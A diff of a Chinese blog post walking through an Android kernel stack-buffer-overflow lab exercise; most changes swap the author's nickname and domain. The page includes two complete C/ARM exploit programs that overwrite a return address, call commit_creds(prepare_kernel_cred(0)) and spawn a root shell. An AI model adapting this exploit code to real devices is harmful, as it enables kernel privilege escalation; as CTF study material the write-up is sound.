@@ -113,34 +113,34 @@
   <meta name="description" content="导语AndroidKernelExploitationPlayground之kernel_exploit_challenges &#x2F; challenge &#x2F; stack_buffer_overflow &#x2F; module &#x2F; stack_buffer_overflow.c">
 <meta property="og:type" content="article">
 <meta property="og:title" content="安卓内核pwn之缓冲区溢出">
-<meta property="og:url" content="https://www.noobgun.club/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/index.html">
-<meta property="og:site_name" content="Gμn_">
+<meta property="og:url" content="https://www.smartpillar.xyz/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/index.html">
+<meta property="og:site_name" content="π1L4r">
 <meta property="og:description" content="导语AndroidKernelExploitationPlayground之kernel_exploit_challenges &#x2F; challenge &#x2F; stack_buffer_overflow &#x2F; module &#x2F; stack_buffer_overflow.c">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://www.noobgun.club/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/1.jpg">
-<meta property="og:image" content="https://www.noobgun.club/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/2.jpg">
-<meta property="og:image" content="https://www.noobgun.club/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/3.jpg">
-<meta property="og:image" content="https://www.noobgun.club/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.jpg">
-<meta property="og:image" content="https://www.noobgun.club/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/5.jpg">
-<meta property="og:image" content="https://www.noobgun.club/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/6.jpg">
+<meta property="og:image" content="https://www.smartpillar.xyz/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/1.jpg">
+<meta property="og:image" content="https://www.smartpillar.xyz/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/2.jpg">
+<meta property="og:image" content="https://www.smartpillar.xyz/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/3.jpg">
+<meta property="og:image" content="https://www.smartpillar.xyz/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.jpg">
+<meta property="og:image" content="https://www.smartpillar.xyz/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/5.jpg">
+<meta property="og:image" content="https://www.smartpillar.xyz/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/6.jpg">
 <meta property="article:published_time" content="2020-07-22T05:04:01.000Z">
-<meta property="article:modified_time" content="2020-07-24T06:28:23.147Z">
-<meta property="article:author" content="Gμn_">
+<meta property="article:modified_time" content="2020-07-25T05:00:03.133Z">
+<meta property="article:author" content="π1L4r">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="android">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://www.noobgun.club/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/1.jpg">
+<meta name="twitter:image" content="https://www.smartpillar.xyz/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/1.jpg">
 
 
   
 
 
-  <link rel="alternate" href="/atom.xml" title="Gμn_" type="application/atom+xml" />
+  <link rel="alternate" href="/atom.xml" title="π1L4r" type="application/atom+xml" />
 
 
 
 
-  <link rel="canonical" href="https://www.noobgun.club/2020/07/22/安卓内核pwn之缓冲区溢出/"/>
+  <link rel="canonical" href="https://www.smartpillar.xyz/2020/07/22/安卓内核pwn之缓冲区溢出/"/>
 
 
 
@@ -150,7 +150,7 @@
   };
 </script>
 
-  <title>安卓内核pwn之缓冲区溢出 | Gμn_</title>
+  <title>安卓内核pwn之缓冲区溢出 | π1L4r</title>
   
 
 
@@ -210,13 +210,13 @@
     <div class="custom-logo-site-title">
       <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Gμn_</span>
+        <span class="site-title">π1L4r</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
     
       
-        <p class="site-subtitle">Stay noob, will ya?</p>
+        <p class="site-subtitle">Stay sharp, stay cool</p>
       
     
   </div>
@@ -360,16 +360,16 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.noobgun.club/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">
+    <link itemprop="mainEntityOfPage" href="https://www.smartpillar.xyz/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Gμn_">
-      <meta itemprop="description" content="a noob will become a big guy.">
+      <meta itemprop="name" content="π1L4r">
+      <meta itemprop="description" content="changed my nickname= =.">
       <meta itemprop="image" content="/images/author.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Gμn_">
+      <meta itemprop="name" content="π1L4r">
     </span>
 
     
@@ -419,7 +419,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2020-07-24 14:28:23" itemprop="dateModified" datetime="2020-07-24T14:28:23+08:00">2020-07-24</time>
+                <time title="修改时间：2020-07-25 13:00:03" itemprop="dateModified" datetime="2020-07-25T13:00:03+08:00">2020-07-25</time>
               
             
           </span>
@@ -489,7 +489,7 @@
 <p>我们就可以抄playground里给我们的solution了</p>
 <h1 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX             64</span><br><br><span class="hljs-keyword">void</span> * prepare_kernel_cred;<br><span class="hljs-keyword">void</span> * commit_creds;<br><span class="hljs-keyword">void</span> * proc_file_write;<br><br><br><span class="hljs-keyword">void</span> *<br>get_ksymbol(<span class="hljs-keyword">char</span> *name)<br>&#123;<br>        FILE *f = fopen(<span class="hljs-string">"/proc/kallsyms"</span>, <span class="hljs-string">"r"</span>);<br>        <span class="hljs-keyword">char</span> c, sym[<span class="hljs-number">512</span>];<br>        <span class="hljs-keyword">void</span> *addr;<br>        <span class="hljs-keyword">int</span> ret;<br><br>        <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fscanf</span>(f, <span class="hljs-string">"%p %c %s\n"</span>, &amp;addr, &amp;c, sym) &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(sym, name))<br>                        <span class="hljs-keyword">return</span> addr;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-keyword">int</span><br>open_file(<span class="hljs-keyword">void</span>)<br>&#123;<br>        <span class="hljs-keyword">int</span> fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">"/proc/stack_buffer_overflow"</span>, O_RDWR);<br>        <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>)<br>                err(<span class="hljs-number">1</span>, <span class="hljs-string">"open"</span>);<br>        <span class="hljs-keyword">return</span> fd;<br>&#125;<br><br><span class="hljs-keyword">void</span><br>payload(<span class="hljs-keyword">void</span>)<br>&#123;<br>        <span class="hljs-keyword">if</span> (getuid() == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] enjoy the shell\n"</span>);<br>                execl(<span class="hljs-string">"/system/bin/sh"</span>, <span class="hljs-string">"sh"</span>, <span class="hljs-literal">NULL</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>                warnx(<span class="hljs-string">"failed to get root. How did we even get here?"</span>);<br>        &#125;<br><br>        _exit(<span class="hljs-number">0</span>);<br>&#125;<br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">uint32_t</span> shellCode[];<br><br><span class="hljs-keyword">asm</span><br>(<br><span class="hljs-string">"    .text\n"</span><br><span class="hljs-string">"    .align 2\n"</span><br><span class="hljs-string">"    .code 32\n"</span><br><span class="hljs-string">"    .globl shellCode\n\t"</span><br><span class="hljs-string">"shellCode:\n\t"</span><br><br><br><span class="hljs-comment">// commit_creds(prepare_kernel_cred(0));</span><br><span class="hljs-comment">// -&gt; get root</span><br><span class="hljs-string">"LDR     R3, =0xc003c814\n\t"</span><br><span class="hljs-string">"MOV     R0, #0\n\t"</span><br><span class="hljs-string">"BLX     R3\n\t"</span><br><span class="hljs-string">"LDR     R3, =0xc003c310\n\t"</span><br><span class="hljs-string">"BLX     R3\n\t"</span><br><br><span class="hljs-comment">//Fix the trashed stack by restoring r4/r5 from duped values on the stack</span><br><span class="hljs-string">"ldr r0, =0xc0104610\t\n"</span><br><span class="hljs-string">"ldr r4, [sp] \t\n"</span><br><span class="hljs-string">"ldr r5, [sp, #4]\t\n"</span><br><span class="hljs-string">"bx r0\t\n"</span><br>);<br><br><br><span class="hljs-keyword">void</span><br>trigger_vuln(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">int</span> canary)<br>&#123;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_PAYLOAD (MAX + 4  * sizeof(void*) )</span><br><br>        <span class="hljs-keyword">char</span> buf[MAX_PAYLOAD];<br><br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">'A'</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>        <span class="hljs-keyword">void</span> * pc = buf + MAX +  <span class="hljs-number">3</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">void</span>*);<br><br>        *(<span class="hljs-keyword">void</span> **)pc  = (<span class="hljs-keyword">void</span> *) shellCode;<br><br>        <span class="hljs-comment">/* Kaboom! */</span><br>        <span class="hljs-built_in">write</span>(fd, buf, <span class="hljs-keyword">sizeof</span>(buf) );<br>&#125;<br><br><span class="hljs-keyword">int</span><br>gather_information(<span class="hljs-keyword">int</span> fd)<br>&#123;<br>        <span class="hljs-keyword">int</span> canary, i;<br><br>        <span class="hljs-keyword">if</span> (lseek(fd, <span class="hljs-number">32</span>, SEEK_SET) == <span class="hljs-number">-1</span>)<br>                err(<span class="hljs-number">2</span>, <span class="hljs-string">"lseek"</span>);<br>        <span class="hljs-built_in">read</span>(fd, &amp;canary, <span class="hljs-keyword">sizeof</span>(canary));<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] found canary: %08x\n"</span>, canary);<br><br>        <span class="hljs-keyword">return</span> canary;<br>&#125;<br><br><span class="hljs-keyword">void</span><br>resolve_kernel_symbols(<span class="hljs-keyword">void</span>)<br>&#123;<br>        prepare_kernel_cred     = get_ksymbol(<span class="hljs-string">"prepare_kernel_cred"</span>);<br>        commit_creds            = get_ksymbol(<span class="hljs-string">"commit_creds"</span>);<br>        proc_file_write         = get_ksymbol(<span class="hljs-string">"proc_file_write"</span>);<br><br>        <span class="hljs-keyword">if</span> (!prepare_kernel_cred || !commit_creds)<br>                errx(<span class="hljs-number">1</span>, <span class="hljs-string">"couldn't map all kernel symbols"</span>);<br>&#125;<br><br><span class="hljs-keyword">int</span><br>main(<span class="hljs-keyword">void</span>)<br>&#123;<br>        <span class="hljs-keyword">int</span> fd, canary;<br><br>        resolve_kernel_symbols();<br><br>        fd = open_file();<br>        canary = gather_information(fd);<br><br>        trigger_vuln(fd, canary);<br><br>        payload();<br>        <span class="hljs-comment">/* If we're here, we've failed. */</span><br>        <span class="hljs-built_in">close</span>(fd);<br><br>        errx(<span class="hljs-string">"[-] exploit failed\n"</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p>这里面有找内核符号的函数，获取proc的函数，构造shellcode的函数等等。<br>不过实际上经过我们的分析和操作，实际上只需要这些代码的一部分就够了。比如找符号的那一部分就可以不要了，这里我们可以抄另一个大佬改的。</p>
+<p>这里面有找内核符号的函数，获取proc的函数，构造shellcode的函数等等。<br>不过实际上经过我们的分析和操作，实际上只需要这些代码的一部分就够了，比如找符号的那一部分就可以不要了。而且这个solution其实本身就有坑，max_payload和pc跳转的位置都8一样，直接跑的话就反手给你来一个pc=AAAAAAA，当场自闭。这里我们可以抄另一个大佬改的。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX             64</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">open_file</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-keyword">int</span> fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">"/proc/stack_buffer_overflow"</span>, O_RDWR);<br>        <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>)<br>                err(<span class="hljs-number">1</span>, <span class="hljs-string">"open"</span>);<br>        <span class="hljs-keyword">return</span> fd;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] enjoy the shell\n"</span>);<br>                execl(<span class="hljs-string">"/system/bin/sh"</span>, <span class="hljs-string">"sh"</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">uint32_t</span> shellCode[];<br><span class="hljs-keyword">asm</span><br>(<br><span class="hljs-string">"    .text\n"</span><br><span class="hljs-string">"    .align 2\n"</span><br><span class="hljs-string">"    .code 32\n"</span><br><span class="hljs-string">"    .globl shellCode\n\t"</span><br><span class="hljs-string">"shellCode:\n\t"</span><br><span class="hljs-comment">// commit_creds(prepare_kernel_cred(0));</span><br><span class="hljs-comment">// -&gt; get root</span><br><span class="hljs-string">"LDR     R3, =0xc0039d34\n\t"</span>   <span class="hljs-comment">//prepare_kernel_cred addr</span><br><span class="hljs-string">"MOV     R0, #0\n\t"</span><br><span class="hljs-string">"BLX     R3\n\t"</span><br><span class="hljs-string">"LDR     R3, =0xc0039834\n\t"</span>   <span class="hljs-comment">//commit_creds addr</span><br><span class="hljs-string">"BLX     R3\n\t"</span><br><br><span class="hljs-string">"mov r3, #0x40000010\n\t"</span><br><span class="hljs-string">"MSR    CPSR_c,R3\n\t"</span><br><span class="hljs-string">"LDR     R3, =0x84c8\n\t"</span>     <span class="hljs-comment">// payload function addr</span><br><span class="hljs-string">"BLX     R3\n\t"</span><br>);<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">trigger_vuln</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_PAYLOAD (MAX + 2  * sizeof(void*) )</span><br>        <span class="hljs-keyword">char</span> buf[MAX_PAYLOAD];<br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">'A'</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>        <span class="hljs-keyword">void</span> * pc = buf + MAX +  <span class="hljs-number">1</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">void</span>*);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"shellcdoe addr: %p\n"</span>, shellCode);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"payload:%p\n"</span>, payload);<br>        *(<span class="hljs-keyword">void</span> **)pc  = (<span class="hljs-keyword">void</span> *) shellCode;   <span class="hljs-comment">//ret addr</span><br>        <span class="hljs-comment">/* Kaboom! */</span><br>        <span class="hljs-built_in">write</span>(fd, buf, <span class="hljs-keyword">sizeof</span>(buf) );<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-keyword">int</span> fd;<br>        fd = open_file();<br>        trigger_vuln(fd);<br>        payload();<br>        <span class="hljs-built_in">close</span>(fd);<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <h1 id="编译利用代码"><a href="#编译利用代码" class="headerlink" title="编译利用代码"></a>编译利用代码</h1><p>在这里你可能遇到找不到各种各样的头文件的错误，大致的解决方案有二。</p>
@@ -525,6 +525,7 @@
 <p>就可以调试安卓模拟器里的程序了。<br>理论上这里可以很快乐的调试，但是由于不知名原因，即便我填上了sysroot，GDB依旧无法加载动态库的符号表，所以出来的都是乱七八糟的，不过问题不大。可以通过看寄存器内容来修改shellcode的地址。</p>
 <h1 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h1><p>我们直接使用大佬改好的代码，运行之后发现会出错，（当你发现你的grep prepare_kernel_cred和grep commit_creds地址和教程一样时，并不意味着人家的代码可以直接套，我又一次领悟了这道理），在gdb里看是访问了一个0x0的地址。仔细一看就是payload地址指歪了。。。<br><img src="/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/5.jpg" alt><br>修改一下就可以了。</p>
 <h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p>先用su把我们的用户权限变低，然后直接干他。<br>（别忘了要把这个东西所在目录的权限变成777，以及这个东西本身变成777）<br><img src="/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/6.jpg" alt><br>执行完毕之后发现我们又回到了root到此就任务完成辣！</p>
+<p>参考链接<br><a href="https://www.anquanke.com/post/id/86617" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86617</a><br><a href="https://www.jianshu.com/p/a81e1dc52a1c" target="_blank" rel="noopener">https://www.jianshu.com/p/a81e1dc52a1c</a></p>
 
       
     </div>
@@ -543,10 +544,10 @@
       <div>
         <ul class="post-copyright">
   <li class="post-copyright-author">
-    <strong>本文作者： </strong>Gμn_</li>
+    <strong>本文作者： </strong>π1L4r</li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://www.noobgun.club/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" title="安卓内核pwn之缓冲区溢出">https://www.noobgun.club/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</a>
+    <a href="https://www.smartpillar.xyz/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" title="安卓内核pwn之缓冲区溢出">https://www.smartpillar.xyz/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！</li>
@@ -583,6 +584,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/01/15/%E8%B7%A8%E5%9F%9F%E5%8F%8A%E5%AE%89%E5%85%A8/" rel="prev" title="跨域及安全">
+                跨域及安全 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -643,10 +648,10 @@
             
               <img class="site-author-image" itemprop="image"
                 src="/images/author.jpg"
-                alt="Gμn_" />
+                alt="π1L4r" />
             
-              <p class="site-author-name" itemprop="name">Gμn_</p>
-              <p class="site-description motion-element" itemprop="description">a noob will become a big guy.</p>
+              <p class="site-author-name" itemprop="name">π1L4r</p>
+              <p class="site-description motion-element" itemprop="description">changed my nickname= =.</p>
           </div>
 
           
@@ -656,7 +661,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">34</span>
+                    <span class="site-state-item-count">35</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -801,11 +806,11 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright"> &copy; <span itemprop="copyrightYear">2020</span>
+        <div class="copyright"> &copy; <span itemprop="copyrightYear">2021</span>
   <span class="with-love" id="animate">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">Gμn_</span>
+  <span class="author" itemprop="copyrightHolder">π1L4r</span>
 
   
 
